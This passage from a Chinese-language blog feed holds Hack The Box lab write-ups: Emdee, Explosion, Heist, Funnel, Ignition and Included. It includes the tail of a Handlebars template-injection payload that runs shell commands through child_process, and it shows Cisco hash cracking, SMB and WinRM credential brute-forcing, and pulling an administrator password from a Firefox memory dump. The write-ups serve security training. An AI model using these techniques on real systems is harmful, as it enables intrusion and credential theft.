class="keyword">with</span> string.<span class="property">split</span> <span class="keyword">as</span> |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> <span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;find / tyep f -name flag.txt 2&gt;/dev/null -exec cat &#123;&#125; \&#x27;);&quot;</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#<span class="keyword">with</span> (string.<span class="property">sub</span>.<span class="property">apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;<span class="variable language_">this</span>&#125;&#125;</span><br><span class="line">          &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">  &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">&#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/N6GIpFBjQ9z1ZHO.png" alt="image-20230313151832481"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li>find -exec命令</li>
<li>SSTI服务端模板注入</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Emdee five for life</title>
    <url>/2023/07/06/HTB-Emdee%20five%20for%20life/</url>
    <content><![CDATA[<h5 id="访问靶机地址"><a href="#访问靶机地址" class="headerlink" title="访问靶机地址"></a>访问靶机地址</h5><p><img src="https://s2.loli.net/2023/04/25/aEwWOZqpAk4MiuU.png" alt="image-20230421172531319"></p>
<h5 id="题目提示是使用MD5加密字符串，提交后显示速度太慢"><a href="#题目提示是使用MD5加密字符串，提交后显示速度太慢" class="headerlink" title="题目提示是使用MD5加密字符串，提交后显示速度太慢"></a>题目提示是使用MD5加密字符串，提交后显示速度太慢</h5><p>解题思路，使用python脚本代替手工提交</p>
<ul>
<li>获取网页中的string字符串</li>
<li>MD5加密字符串</li>
<li>提交加密后的数据</li>
</ul>
<h5 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author ZPast0r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selectolax.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="comment"># 网站地址</span></span><br><span class="line">url = <span class="string">&#x27;http://161.35.36.167:32078&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">html = r.get(url)</span><br><span class="line">text = html.text</span><br><span class="line">tree = HTMLParser(text)</span><br><span class="line"><span class="keyword">for</span> node  <span class="keyword">in</span> tree.css(<span class="string">&quot;h3&quot;</span>):</span><br><span class="line">    MD5 = node.text(strip=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(MD5)</span><br><span class="line">final = hashlib.md5(MD5.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">data = &#123;<span class="string">&#x27;hash&#x27;</span>:final&#125;</span><br><span class="line">posthtml = r.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(posthtml.text)</span><br></pre></td></tr></table></figure>

<h5 id="运行python脚本，得到flag"><a href="#运行python脚本，得到flag" class="headerlink" title="运行python脚本，得到flag"></a>运行python脚本，得到flag</h5><p><img src="https://s2.loli.net/2023/04/25/7IouOetkFxfhBN8.png" alt="image-20230421173053276"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li>可以使用正则表达式提取flag字段</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Explosion</title>
    <url>/2023/07/06/HTB-Explosion/</url>
    <content><![CDATA[<h5 id="一、RDP的全称是什么？"><a href="#一、RDP的全称是什么？" class="headerlink" title="一、RDP的全称是什么？"></a>一、RDP的全称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Remote Desktop Protocol</span><br></pre></td></tr></table></figure>

<h5 id="二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？"><a href="#二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？" class="headerlink" title="二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？"></a>二、通过命令行界面与主机进行交互的单词全称的3个首字母什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cli</span><br></pre></td></tr></table></figure>

<h5 id="三、通过图形界面与主机进行交互的单词全称的3个首字母什么？"><a href="#三、通过图形界面与主机进行交互的单词全称的3个首字母什么？" class="headerlink" title="三、通过图形界面与主机进行交互的单词全称的3个首字母什么？"></a>三、通过图形界面与主机进行交互的单词全称的3个首字母什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GUI</span><br></pre></td></tr></table></figure>

<h5 id="四、默认情况下没有加密并侦听-TCP-端口-23-的旧远程访问工具的名称是什么？"><a href="#四、默认情况下没有加密并侦听-TCP-端口-23-的旧远程访问工具的名称是什么？" class="headerlink" title="四、默认情况下没有加密并侦听 TCP 端口 23 的旧远程访问工具的名称是什么？"></a>四、默认情况下没有加密并侦听 TCP 端口 23 的旧远程访问工具的名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">telnet</span><br></pre></td></tr></table></figure>

<h5 id="五、在端口-3389-TCP-上运行的服务的名称是什么？"><a href="#五、在端口-3389-TCP-上运行的服务的名称是什么？" class="headerlink" title="五、在端口 3389 TCP 上运行的服务的名称是什么？"></a>五、在端口 3389 TCP 上运行的服务的名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ms-wbt-server</span><br></pre></td></tr></table></figure>

<h5 id="六、使用-xfreerdp-时，用于指定目标主机-IP-地址的交换机是什么？"><a href="#六、使用-xfreerdp-时，用于指定目标主机-IP-地址的交换机是什么？" class="headerlink" title="六、使用 xfreerdp 时，用于指定目标主机 IP 地址的交换机是什么？"></a>六、使用 xfreerdp 时，用于指定目标主机 IP 地址的交换机是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali中使用xfreerdp</span></span><br><span class="line">xfreerdp -h</span><br></pre></td></tr></table></figure>

<h5 id="七、哪个用户名使用空白密码成功将桌面投影返回给我们？"><a href="#七、哪个用户名使用空白密码成功将桌面投影返回给我们？" class="headerlink" title="七、哪个用户名使用空白密码成功将桌面投影返回给我们？"></a>七、哪个用户名使用空白密码成功将桌面投影返回给我们？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用xfreerdp链接</span></span><br><span class="line">xfreerdp /u:administrator /v:IP</span><br></pre></td></tr></table></figure>

<h5 id="八、提交flag"><a href="#八、提交flag" class="headerlink" title="八、提交flag"></a>八、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">链接成功后，flag文件在桌面</span></span><br><span class="line">951fa96d7830c451b536be5a6be008a0</span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>xfreerdp工具的使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:uersname /v:IP:port /p:passwrod</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Heist</title>
    <url>/2023/07/06/HTB-Heist/</url>
    <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ul>
<li><p>端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -Pn -p- 10.129.96.157</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/25/KTIYJFcknxitqgL.png" alt="image-20230424160430769"></p>
</li>
<li><p>目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.129.96.157/ -w /usr/share/wordlists/dirb/commont.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/25/85kyNShrEGMq6Db.png" alt="image-20230423145246987"></p>
</li>
</ul>
<h5 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h5><ul>
<li><p>访问登陆页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.129.96.157/</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/25/NvxTCJSM89opcYG.png" alt="image-20230423145603356"></p>
<ul>
<li><p>访问Login as guest页面，发现Cisco Attachment文件</p>
<p><img src="https://s2.loli.net/2023/04/25/s8n3jgixABz2hJt.png" alt="image-20230423150123112"></p>
</li>
<li><p>访问Cisco Attachment文件</p>
<p><img src="https://s2.loli.net/2023/04/25/gGl51hBdCWtcxfH.png" alt="image-20230423150225668"></p>
</li>
<li><p>整理用户名密码</p>
<table>
<thead>
<tr>
<th>用户名</th>
<th>hash</th>
<th>明文密码</th>
</tr>
</thead>
<tbody><tr>
<td>rout3r</td>
<td>0242114B0E143F015F5D1E161713</td>
<td></td>
</tr>
<tr>
<td>admin</td>
<td>02375012182C1A1D751618034F36415408</td>
<td></td>
</tr>
<tr>
<td>Hazard</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>$1$pdQGo8nrSzsGXeaduXrjlvKc91</td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p>破解密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.ifm.net.nz/cookbooks/passwordcracker.html</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>用户名</th>
<th>hash</th>
<th>明文密码</th>
</tr>
</thead>
<tbody><tr>
<td>rout3r</td>
<td>0242114B0E143F015F5D1E161713</td>
<td>$uperP@ssword</td>
</tr>
<tr>
<td>admin</td>
<td>02375012182C1A1D751618034F36415408</td>
<td>Q4)sJu\Y8qz*A3?d</td>
</tr>
<tr>
<td>Hazard</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>$1$pdQGo8nrSzsGXeaduXrjlvKc91</td>
<td>stealth1agent</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h5></li>
<li><p>SMB漏洞</p>
<ul>
<li>爆破用户名密码</li>
</ul>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">show options</span><br><span class="line">set rhost</span><br><span class="line">set user_file</span><br><span class="line">set pass_file</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>  <img src="https://s2.loli.net/2023/04/25/qk7eXfiTBGUlQ6m.png" alt="image-20230424173141368"></p>
<ul>
<li><p>使用用户名密码尝试登录失败</p>
<p><img src="https://s2.loli.net/2023/04/25/FJW1srPltBjMONV.png" alt="image-20230424220330565"></p>
</li>
<li><p>使用impacket-lookupsid.py枚举更多用户名</p>
</li>
</ul>
<p>  <img src="https://s2.loli.net/2023/04/25/SVjUpwxdmBgc9tf.png" alt="image-20230424221326818"></p>
<ul>
<li>将枚举的用户添加到字典，爆破出Chase用户，依旧登录失败</li>
</ul>
<p>  <img src="https://s2.loli.net/2023/04/25/35XTMU7tl2KOI1C.png" alt="image-20230425101331926"></p>
<p>  <img src="https://s2.loli.net/2023/04/25/mRvTo2yeaHkOBcD.png" alt="image-20230425101343832"></p>
</li>
<li><p>使用crackmapexec爆破winrm用户名密码</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm 10.129.96.157 -u user.txt -p passwd.txt</span><br></pre></td></tr></table></figure>

<p>  <img src="https://s2.loli.net/2023/04/25/iog896rXQR3NAs1.png" alt="image-20230425103325189"></p>
<ul>
<li><p>使用crackmapexec -x执行命令(zsh需要增加\ \包裹特殊字符)</p>
<p>  <img src="https://s2.loli.net/2023/04/25/GuoQZbc5xPjIv2U.png" alt="image-20230425104355003"></p>
</li>
</ul>
</li>
<li><p>使用evil-winrm连接靶机</p>
<ul>
<li><p>evil-winrm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#zsh需要使用\ \包裹密码中的特殊字符</span><br><span class="line">evil-winrm -i 10.129.96.157 -u Chase -p Q4)sJu\Y8qz*A3?d</span><br></pre></td></tr></table></figure>
</li>
<li><p>在Chase用户的Desktop文件夹中找到flag文件user.txt</p>
<p><img src="https://s2.loli.net/2023/04/25/FeD5mMvYqE4XsLR.png" alt="image-20230425105246951"></p>
</li>
</ul>
</li>
</ul>
<h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><ul>
<li><p>上传winpeas工具，发现有firefox的db文件，没找到登录内容文件</p>
<p><img src="https://s2.loli.net/2023/04/25/ZMG9uIWeds3LU7a.png" alt="image-20230425152321473"></p>
</li>
<li><p>查看进程，发现firefox</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/25/WXVPwYhOmj64lkI.png" alt="image-20230425152437630"></p>
</li>
<li><p>使用微软的procdump工具导出firefox进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载地址</span><br><span class="line">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</span><br><span class="line">#上传到靶机</span><br><span class="line">./procdump64.exe -mp 6740 </span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/25/Arc8TGNpLutWKmQ.png" alt="image-20230425152842595"></p>
</li>
<li><p>搜索文件中的password字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-content firefox.exe_230425_125827.dmp | findstr &quot;password&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/25/6YwH39puVoJGgN5.png" alt="image-20230425153133463"></p>
</li>
<li><p>使用evil-winrm登录管理员账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -L 10.129.96.157 -u Administrator -p 4dD!5&#125;x/re8]FBuZ</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/25/1h5GIeEaPJfcH3x.png" alt="image-20230425153333548"></p>
</li>
<li><p>在Desktop文件夹中找到flag文件root.txt</p>
<p><img src="https://s2.loli.net/2023/04/25/P2UdqM7Xn3NKi8x.png" alt="image-20230425153420331"></p>
</li>
</ul>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>思科路由器密码破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.ifm.net.nz/cookbooks/passwordcracker.html</span><br></pre></td></tr></table></figure>
</li>
<li><p>smb登录破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br></pre></td></tr></table></figure>
</li>
<li><p>用户名枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-lookupsid username@ip</span><br></pre></td></tr></table></figure>
</li>
<li><p>crackmapexec爆破winrm用户名密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm  IP -u username -p password</span><br><span class="line">#执行命令</span><br><span class="line">crackmapexec winrm IP -u username -p password -x whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>evil-winrm的使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i IP -u username -p password</span><br><span class="line">#不上传直接执行sectools文件夹下的程序</span><br><span class="line">evil-winrm -i IP -u username -p password -e /home/sectools/</span><br><span class="line">invoke-Binary /home/sectools/winpeasx64.exe</span><br><span class="line">#上传文件</span><br><span class="line">upload /home/sectools/example.exe</span><br><span class="line">#下载文件</span><br><span class="line">download C:\Users\Chase\Desktop\example.txt /home/sectools/example.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>procdump</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./procdump.exe -mp PID</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell下查看dmp文件，寻找关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-content example.dmp | findstr &quot;password&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>SMB爆破,procdump</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Funnel</title>
    <url>/2023/07/06/HTB-Funnel/</url>
    <content><![CDATA[<h5 id="一、打开了多少个-TCP-端口？"><a href="#一、打开了多少个-TCP-端口？" class="headerlink" title="一、打开了多少个 TCP 端口？"></a>一、打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap扫描IP</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/J4AzfhgCrTS6bRt.png" alt="image-20230313153616428"></p>
<h5 id="二、FTP-服务器上可用的目录的名称是什么？"><a href="#二、FTP-服务器上可用的目录的名称是什么？" class="headerlink" title="二、FTP 服务器上可用的目录的名称是什么？"></a>二、FTP 服务器上可用的目录的名称是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-backup</span><br></pre></td></tr></table></figure>

<h5 id="三、“Funnel”团队中的每个新成员都应尽快更改的默认帐户密码是什么？"><a href="#三、“Funnel”团队中的每个新成员都应尽快更改的默认帐户密码是什么？" class="headerlink" title="三、“Funnel”团队中的每个新成员都应尽快更改的默认帐户密码是什么？"></a>三、“Funnel”团队中的每个新成员都应尽快更改的默认帐户密码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ftp Anonymous@IP，密码为空</span></span><br><span class="line">ftp Anonymous@IP</span><br><span class="line">cd mail_backup</span><br><span class="line">get password_policy.pdf</span><br><span class="line">get welcome_28112022</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看password_policy.pdf</span></span><br><span class="line"><span class="meta prompt_">funnel123#</span><span class="language-bash">!<span class="comment">#</span></span></span><br></pre></td></tr></table></figure>

<h5 id="四、哪个用户尚未更改其默认密码？"><a href="#四、哪个用户尚未更改其默认密码？" class="headerlink" title="四、哪个用户尚未更改其默认密码？"></a>四、哪个用户尚未更改其默认密码？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看welcome_28112022文件</span><br><span class="line">christine</span><br></pre></td></tr></table></figure>

<h5 id="五、哪个服务在-TCP-端口-5432-上运行并且仅在本地主机上侦听？"><a href="#五、哪个服务在-TCP-端口-5432-上运行并且仅在本地主机上侦听？" class="headerlink" title="五、哪个服务在 TCP 端口 5432 上运行并且仅在本地主机上侦听？"></a>五、哪个服务在 TCP 端口 5432 上运行并且仅在本地主机上侦听？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用ssh链接主机，用户名：christine，密码：funnel123<span class="comment">#!#</span></span></span><br><span class="line">ssh christine@IP</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用ss -tl命令列出服务</span></span><br><span class="line">ss -tl</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/5LkdSpYHugn9i6h.png" alt="image-20230313170450995"></p>
<h5 id="六、由于无法从本地计算机访问前面提到的服务，因此必须创建一个隧道并从计算机连接到它。使用哪种隧道的正确类型？-remote-port-forwarding-or-local-port-forwarding"><a href="#六、由于无法从本地计算机访问前面提到的服务，因此必须创建一个隧道并从计算机连接到它。使用哪种隧道的正确类型？-remote-port-forwarding-or-local-port-forwarding" class="headerlink" title="六、由于无法从本地计算机访问前面提到的服务，因此必须创建一个隧道并从计算机连接到它。使用哪种隧道的正确类型？ remote port forwarding or local port forwarding?"></a>六、由于无法从本地计算机访问前面提到的服务，因此必须创建一个隧道并从计算机连接到它。使用哪种隧道的正确类型？ remote port forwarding or local port forwarding?</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local port forwarding</span><br></pre></td></tr></table></figure>

<h5 id="七、持有标志的数据库的名称是什么？"><a href="#七、持有标志的数据库的名称是什么？" class="headerlink" title="七、持有标志的数据库的名称是什么？"></a>七、持有标志的数据库的名称是什么？</h5><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line">#使用SSH进行端口转发</span><br><span class="line">ssh -L <span class="number">1234</span>:localhost:<span class="number">5432</span> christine@IP</span><br><span class="line">#链接postgresql</span><br><span class="line">psql -U christine -h localhost -p <span class="number">1234</span></span><br><span class="line">#列出数据库</span><br><span class="line">l\</span><br><span class="line">secrets</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/wfmpqW6XiOxsQT7.png" alt="image-20230313172525055"></p>
<p><img src="https://s2.loli.net/2023/03/13/9GZ5sdPaNSXmhxk.png" alt="image-20230313172543061"></p>
<p><img src="https://s2.loli.net/2023/03/13/4I5yqhGBbm9HDR1.png" alt="image-20230313172600315"></p>
<h5 id="八、您可以使用动态隧道而不是本地端口转发吗？yes-or-no。"><a href="#八、您可以使用动态隧道而不是本地端口转发吗？yes-or-no。" class="headerlink" title="八、您可以使用动态隧道而不是本地端口转发吗？yes or no。"></a>八、您可以使用动态隧道而不是本地端口转发吗？yes or no。</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure>

<h5 id="九、提交flag"><a href="#九、提交flag" class="headerlink" title="九、提交flag"></a>九、提交flag</h5><p><img src="https://s2.loli.net/2023/03/13/dtbfFa5PkiXV7Hp.png" alt="image-20230313173137610"></p>
<p><img src="https://s2.loli.net/2023/03/13/m256X4yEJKuCZPt.png" alt="image-20230313173157712"></p>
<p><img src="https://s2.loli.net/2023/03/13/SpUcYgVK53stBZF.png" alt="image-20230313173210410"></p>
<p><img src="https://s2.loli.net/2023/03/13/PcGZnvYSQeHlxRf.png" alt="image-20230313173231260"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Ignition</title>
    <url>/2023/07/06/HTB-Ignition/</url>
    <content><![CDATA[<h5 id="一、发现哪个服务版本在端口-80-上运行？"><a href="#一、发现哪个服务版本在端口-80-上运行？" class="headerlink" title="一、发现哪个服务版本在端口 80 上运行？"></a>一、发现哪个服务版本在端口 80 上运行？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap进行扫描</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">nginx 1.14.2</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/d4Yo6wEsk1gQKIp.png" alt="image-20230310143400284"></p>
<h5 id="二、访问-http-x2F-x2F-机器-IP-时返回的-3-位-HTTP-状态代码是什么？"><a href="#二、访问-http-x2F-x2F-机器-IP-时返回的-3-位-HTTP-状态代码是什么？" class="headerlink" title="二、访问 http:&#x2F;&#x2F;{机器 IP} 时返回的 3 位 HTTP 状态代码是什么？"></a>二、访问 http:&#x2F;&#x2F;{机器 IP} 时返回的 3 位 HTTP 状态代码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用curl -v http://IP</span></span><br><span class="line">curl -v http://IP</span><br><span class="line">302</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/RIlv3h5fewHXtJx.png" alt="image-20230310143807830"></p>
<h5 id="三、网页希望通过什么虚拟主机名访问？"><a href="#三、网页希望通过什么虚拟主机名访问？" class="headerlink" title="三、网页希望通过什么虚拟主机名访问？"></a>三、网页希望通过什么虚拟主机名访问？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ignition.HTB</span><br></pre></td></tr></table></figure>

<h5 id="四、Linux-计算机上保存域名到-IP-地址对的本地列表的文件的完整路径是什么？"><a href="#四、Linux-计算机上保存域名到-IP-地址对的本地列表的文件的完整路径是什么？" class="headerlink" title="四、Linux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？"></a>四、Linux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>

<h5 id="五、使用工具暴力破解-Web-服务器上的目录。Magento登录页面的完整URL是什么？"><a href="#五、使用工具暴力破解-Web-服务器上的目录。Magento登录页面的完整URL是什么？" class="headerlink" title="五、使用工具暴力破解 Web 服务器上的目录。Magento登录页面的完整URL是什么？"></a>五、使用工具暴力破解 Web 服务器上的目录。Magento登录页面的完整URL是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用gobuster进行目录爆破</span></span><br><span class="line">gobuster dir http://ignition.HTB -w /usr/share/wordlist/dirb/comment.txt</span><br><span class="line">http://ignition.HTB/admin</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/1Ygwe9GDVo3UHcL.png" alt="image-20230310150624992"></p>
<h5 id="六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？"><a href="#六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？" class="headerlink" title="六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？"></a>六、查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用burp进行爆破，有防御措施</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">弱密码地址</span></span><br><span class="line">https://nordpass.com/most-common-passwords-list/</span><br><span class="line">Admin/qwerty123</span><br></pre></td></tr></table></figure>

<h5 id="七、提交flag"><a href="#七、提交flag" class="headerlink" title="七、提交flag"></a>七、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">797d6c988d9dc5865e010b9410f247e0</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/dC8T25HVBMbIKPL.png" alt="image-20230310154900055"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>curl的用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看应用返回的状态码</span></span><br><span class="line">curl -v http://IP/</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Included</title>
    <url>/2023/07/06/HTB-Included/</url>
    <content><![CDATA[<h5 id="一、-目标计算机上通过-UDP运行什么服务？"><a href="#一、-目标计算机上通过-UDP运行什么服务？" class="headerlink" title="一、 目标计算机上通过 UDP运行什么服务？"></a>一、 目标计算机上通过 UDP运行什么服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">nmpa -sU IP</span><br><span class="line">tftp</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/a1mhGTJAU7df4ur.png" alt="image-20230316111033677"></p>
<h5 id="二、托管在端口-80-上的网页容易受到哪类漏洞的攻击？"><a href="#二、托管在端口-80-上的网页容易受到哪类漏洞的攻击？" class="headerlink" title="二、托管在端口 80 上的网页容易受到哪类漏洞的攻击？"></a>二、托管在端口 80 上的网页容易受到哪类漏洞的攻击？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#本地文件包含</span><br><span class="line">Local File Inclusion</span><br></pre></td></tr></table></figure>

<h5 id="三、TFTP-用于存储文件的默认系统文件夹是什么？"><a href="#三、TFTP-用于存储文件的默认系统文件夹是什么？" class="headerlink" title="三、TFTP 用于存储文件的默认系统文件夹是什么？"></a>三、TFTP 用于存储文件的默认系统文件夹是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/tftpboot/</span><br></pre></td></tr></table></figure>

